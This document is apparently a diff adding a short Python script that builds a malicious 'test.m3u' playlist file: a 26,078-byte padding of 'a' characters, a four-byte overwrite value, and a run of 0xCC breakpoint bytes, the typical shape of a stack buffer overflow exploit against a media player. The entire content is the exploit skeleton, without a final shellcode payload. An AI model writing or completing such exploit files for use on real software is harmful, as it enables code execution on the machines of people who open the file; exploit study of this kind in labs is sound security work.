@@ -1,0 +1,9 @@
+
+
+file=open('test.m3u','wb')
+buf='a'*26078
+buf=buf+"\x7b\x46\x66\x7c"#\x7b\x46\x66\x7c
+# buf=buf+'ccccccccccccccccccccc'
+buf=buf+'\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc'
+file.write(buf.encode('utf-8'))
+file.close()
